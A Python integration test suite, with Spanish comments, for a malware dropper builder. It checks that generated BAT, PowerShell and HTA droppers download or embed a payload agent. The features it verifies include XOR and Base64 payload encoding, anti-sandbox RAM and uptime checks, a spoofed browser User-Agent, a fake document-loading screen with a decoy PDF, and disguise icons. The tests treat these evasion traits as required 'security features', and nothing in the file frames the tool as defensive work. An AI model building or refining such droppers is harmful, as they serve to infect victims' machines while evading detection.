#!/usr/bin/env python3
"""
========================================================================
PRUEBAS DE INTEGRACIÓN - Sistema de Droppers Completo
========================================================================
Valida el flujo completo de generación de droppers:
1. Creación de agente mock
2. Generación de todos los tipos de droppers
3. Validación de estructura y contenido
4. Verificación de funcionalidad básica

EJECUCIÓN:
    python test_integration.py
========================================================================
"""

import unittest
import os
import tempfile
import shutil
import subprocess
import sys
from pathlib import Path

# Añadir directorio actual al path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

try:
    import builder
    import download_icon
except ImportError as e:
    print(f"[!] Error importando módulos: {e}")
    sys.exit(1)

class TestDropperIntegration(unittest.TestCase):
    """Pruebas de integración completas del sistema de droppers"""
    
    def setUp(self):
        """Preparar entorno de pruebas"""
        self.test_dir = tempfile.mkdtemp()
        self.mock_agent = os.path.join(self.test_dir, 'mock_agent.exe')
        
        # Crear un agente mock con estructura PE básica
        self._create_mock_agent()
        
        # Configuración de prueba
        self.payload_url = "http://test-server.local/agent.exe"
        self.decoy_url = "http://test-server.local/documento.pdf"
    
    def tearDown(self):
        """Limpiar después de las pruebas"""
        shutil.rmtree(self.test_dir, ignore_errors=True)
    
    def _create_mock_agent(self):
        """Crea un agente mock con header PE válido"""
        # Header MZ (DOS stub) + datos aleatorios
        pe_header = b'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00'
        pe_header += b'\xb8\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00'
        pe_header += b'\x00' * 32  # Padding
        pe_header += b'PE\x00\x00'  # PE signature
        pe_header += b'\x00' * 200  # Resto del header
        pe_header += b'\x90' * 1000  # Código simulado
        
        with open(self.mock_agent, 'wb') as f:
            f.write(pe_header)
    
    def test_end_to_end_bat_dropper(self):
        """Test completo: generar y validar dropper BAT"""
        print("\n[TEST] Generando dropper BAT...")
        
        output_file = os.path.join(self.test_dir, 'test.bat')
        
        # Generar dropper
        builder.build_bat_dropper(
            self.mock_agent,
            output_file,
            self.payload_url,
            "documento_test.pdf"
        )
        
        # Verificar que se creó
        self.assertTrue(os.path.exists(output_file))
        
        # Verificar contenido
        with open(output_file, 'r') as f:
            content = f.read()
            
        # Verificar elementos esenciales
        self.assertIn(self.payload_url, content)
        self.assertIn('documento_test.pdf', content)
        self.assertIn('powershell', content.lower())
        self.assertIn('User-Agent', content)
        self.assertIn('Mozilla', content)
        self.assertIn('timeout', content.lower())
        
        # Verificar estructura BAT
        self.assertIn('@echo off', content)
        self.assertIn('%APPDATA%', content)
        
        print(f"[✓] BAT dropper generado: {len(content)} bytes")
    
    def test_end_to_end_ps1_dropper(self):
        """Test completo: generar y validar dropper PowerShell"""
        print("\n[TEST] Generando dropper PowerShell...")
        
        output_file = os.path.join(self.test_dir, 'test.ps1')
        xor_key = "test_integration_key_2024"
        
        # Generar dropper
        builder.build_ps1_dropper(
            self.mock_agent,
            output_file,
            self.decoy_url,
            xor_key
        )
        
        # Verificar que se creó
        self.assertTrue(os.path.exists(output_file))
        
        # Verificar contenido
        with open(output_file, 'r') as f:
            content = f.read()
        
        # Verificar elementos esenciales
        self.assertIn(xor_key, content)
        self.assertIn(self.decoy_url, content)
        self.assertIn('FromBase64String', content)
        self.assertIn('Get-WmiObject', content)  # Anti-sandbox
        self.assertIn('TotalPhysicalMemory', content)  # RAM check
        
        # Verificar que el payload está codificado
        self.assertIn('$p=', content)
        
        # Verificar que hay ofuscación básica
        self.assertIn('$', content)  # Variables PowerShell
        
        print(f"[✓] PS1 dropper generado: {len(content)} bytes")
    
    def test_end_to_end_hta_dropper(self):
        """Test completo: generar y validar dropper HTA"""
        print("\n[TEST] Generando dropper HTA...")
        
        output_file = os.path.join(self.test_dir, 'test.hta')
        
        # Generar dropper
        builder.build_hta_dropper(
            self.mock_agent,
            output_file,
            self.payload_url,
            self.decoy_url
        )
        
        # Verificar que se creó
        self.assertTrue(os.path.exists(output_file))
        
        # Verificar contenido
        with open(output_file, 'r') as f:
            content = f.read()
        
        # Verificar estructura HTML/HTA
        self.assertIn('<!DOCTYPE html>', content)
        self.assertIn('<HTA:APPLICATION', content)
        self.assertIn('</html>', content)
        
        # Verificar elementos visuales
        self.assertIn('Cargando documento', content)
        self.assertIn('spinner', content)
        
        # Verificar VBScript
        self.assertIn('vbscript', content.lower())
        self.assertIn('CreateObject', content)
        self.assertIn('WScript.Shell', content)
        
        # Verificar funcionalidad
        self.assertIn(self.payload_url, content)
        self.assertIn(self.decoy_url, content)
        
        print(f"[✓] HTA dropper generado: {len(content)} bytes")
    
    def test_all_droppers_generation(self):
        """Test de generación de todos los tipos simultáneamente"""
        print("\n[TEST] Generando todos los tipos de droppers...")
        
        droppers = {
            'bat': os.path.join(self.test_dir, 'test.bat'),
            'ps1': os.path.join(self.test_dir, 'test.ps1'),
            'hta': os.path.join(self.test_dir, 'test.hta')
        }
        
        # Generar todos
        builder.build_bat_dropper(
            self.mock_agent,
            droppers['bat'],
            self.payload_url
        )
        
        builder.build_ps1_dropper(
            self.mock_agent,
            droppers['ps1'],
            self.decoy_url
        )
        
        builder.build_hta_dropper(
            self.mock_agent,
            droppers['hta'],
            self.payload_url,
            self.decoy_url
        )
        
        # Verificar que todos se crearon
        for dtype, path in droppers.items():
            self.assertTrue(os.path.exists(path), 
                          f"Dropper {dtype} no se generó")
            
            # Verificar que tienen contenido
            size = os.path.getsize(path)
            self.assertGreater(size, 100, 
                             f"Dropper {dtype} está vacío o muy pequeño")
            
            print(f"[✓] {dtype.upper()} dropper: {size} bytes")
    
    def test_xor_encryption_integrity(self):
        """Test de integridad del cifrado XOR"""
        print("\n[TEST] Verificando integridad de cifrado XOR...")
        
        # Leer el agente mock
        with open(self.mock_agent, 'rb') as f:
            original_data = f.read()
        
        key = "test_key_for_encryption"
        
        # Encriptar
        encrypted = builder.xor_encrypt(original_data, key)
        
        # Verificar que cambió
        self.assertNotEqual(original_data, encrypted)
        
        # Desencriptar
        decrypted = builder.xor_encrypt(encrypted, key)
        
        # Verificar que se recuperó el original
        self.assertEqual(original_data, decrypted)
        
        # Verificar que el tamaño se mantuvo
        self.assertEqual(len(original_data), len(encrypted))
        self.assertEqual(len(original_data), len(decrypted))
        
        print(f"[✓] XOR encryption OK: {len(original_data)} bytes")
    
    def test_random_name_distribution(self):
        """Test de distribución de nombres aleatorios"""
        print("\n[TEST] Verificando generación de nombres aleatorios...")
        
        # Generar muchos nombres
        names = set()
        for _ in range(1000):
            name = builder.generate_random_name(8)
            names.add(name)
        
        # Verificar unicidad (debe ser >99%)
        uniqueness = len(names) / 1000 * 100
        self.assertGreater(uniqueness, 99.0)
        
        # Verificar formato
        for name in list(names)[:10]:  # Verificar algunos
            self.assertEqual(len(name), 8)
            self.assertTrue(name.isalnum())
            self.assertTrue(name.islower() or name.isdigit())
        
        print(f"[✓] Nombres únicos: {uniqueness:.1f}%")
    
    def test_icon_urls_availability(self):
        """Test de disponibilidad de URLs de iconos"""
        print("\n[TEST] Verificando URLs de iconos...")
        
        # Verificar que ICON_URLS está definido
        self.assertIsInstance(download_icon.ICON_URLS, dict)
        self.assertGreater(len(download_icon.ICON_URLS), 0)
        
        # Verificar tipos esenciales
        essential_types = ['pdf', 'word', 'excel']
        for icon_type in essential_types:
            self.assertIn(icon_type, download_icon.ICON_URLS)
            url = download_icon.ICON_URLS[icon_type]
            self.assertTrue(url.startswith('http'))
            self.assertTrue(url.endswith('.png') or url.endswith('.ico'))
        
        print(f"[✓] {len(download_icon.ICON_URLS)} tipos de iconos disponibles")
    
    def test_dropper_security_features(self):
        """Test de características de seguridad en droppers"""
        print("\n[TEST] Verificando características de seguridad...")
        
        # Generar PS1 con features de seguridad
        output_file = os.path.join(self.test_dir, 'security_test.ps1')
        builder.build_ps1_dropper(
            self.mock_agent,
            output_file,
            self.decoy_url
        )
        
        with open(output_file, 'r') as f:
            ps1_content = f.read()
        
        # Features específicas de PS1 (embedded payload)
        ps1_security_features = {
            'Anti-Sandbox (RAM)': 'TotalPhysicalMemory',
            'Anti-Sandbox (Uptime)': 'LastBootUpTime',
            'XOR Encryption': 'bxor',
            'Base64 Encoding': 'FromBase64String'
        }
        
        for feature, marker in ps1_security_features.items():
            self.assertIn(marker, ps1_content, 
                         f"Falta feature de seguridad en PS1: {feature}")
            print(f"[✓] PS1 - {feature}: presente")
        
        # Generar BAT para verificar User-Agent
        bat_file = os.path.join(self.test_dir, 'security_test.bat')
        builder.build_bat_dropper(
            self.mock_agent,
            bat_file,
            self.payload_url
        )
        
        with open(bat_file, 'r') as f:
            bat_content = f.read()
        
        # Features específicas de BAT (download-based)
        self.assertIn('User-Agent', bat_content)
        self.assertIn('Mozilla', bat_content)
        print(f"[✓] BAT - User-Agent Spoofing: presente")


class TestDropperWorkflow(unittest.TestCase):
    """Test del flujo de trabajo completo"""
    
    def setUp(self):
        """Preparar entorno"""
        self.test_dir = tempfile.mkdtemp()
        self.script_dir = os.path.dirname(os.path.abspath(__file__))
    
    def tearDown(self):
        """Limpiar"""
        shutil.rmtree(self.test_dir, ignore_errors=True)
    
    def test_builder_cli_help(self):
        """Test de interfaz CLI del builder"""
        print("\n[TEST] Verificando CLI del builder...")
        
        builder_script = os.path.join(self.script_dir, 'builder.py')
        
        # Ejecutar con --help
        result = subprocess.run(
            [sys.executable, builder_script, '--help'],
            capture_output=True,
            text=True
        )
        
        # Verificar que muestra ayuda
        self.assertEqual(result.returncode, 0)
        self.assertIn('--agent', result.stdout)
        self.assertIn('--output', result.stdout)
        self.assertIn('--type', result.stdout)
        
        print("[✓] CLI help funcional")
    
    def test_all_scripts_syntax(self):
        """Test de sintaxis de todos los scripts"""
        print("\n[TEST] Verificando sintaxis de scripts...")
        
        scripts = [
            'builder.py',
            'download_icon.py',
            'test_droppers.py'
        ]
        
        for script in scripts:
            script_path = os.path.join(self.script_dir, script)
            
            if not os.path.exists(script_path):
                self.skipTest(f"{script} no encontrado")
            
            # Compilar el script (verifica sintaxis)
            result = subprocess.run(
                [sys.executable, '-m', 'py_compile', script_path],
                capture_output=True
            )
            
            self.assertEqual(result.returncode, 0,
                           f"Error de sintaxis en {script}")
            
            print(f"[✓] {script}: sintaxis OK")

def run_integration_tests():
    """Ejecutar todas las pruebas de integración"""
    print("=" * 70)
    print("PRUEBAS DE INTEGRACIÓN - Sistema de Droppers Completo")
    print("=" * 70)
    print()
    
    # Crear suite
    loader = unittest.TestLoader()
    suite = unittest.TestSuite()
    
    # Añadir pruebas
    suite.addTests(loader.loadTestsFromTestCase(TestDropperIntegration))
    suite.addTests(loader.loadTestsFromTestCase(TestDropperWorkflow))
    
    # Ejecutar
    runner = unittest.TextTestRunner(verbosity=2)
    result = runner.run(suite)
    
    # Resumen
    print()
    print("=" * 70)
    print("RESUMEN DE INTEGRACIÓN")
    print("=" * 70)
    print(f"Pruebas ejecutadas: {result.testsRun}")
    print(f"Exitosas: {result.testsRun - len(result.failures) - len(result.errors)}")
    print(f"Fallidas: {len(result.failures)}")
    print(f"Errores: {len(result.errors)}")
    print()
    
    if result.wasSuccessful():
        print("✅ TODAS LAS PRUEBAS DE INTEGRACIÓN PASARON")
    else:
        print("❌ ALGUNAS PRUEBAS FALLARON")
    
    return result.wasSuccessful()

if __name__ == '__main__':
    success = run_integration_tests()
    sys.exit(0 if success else 1)
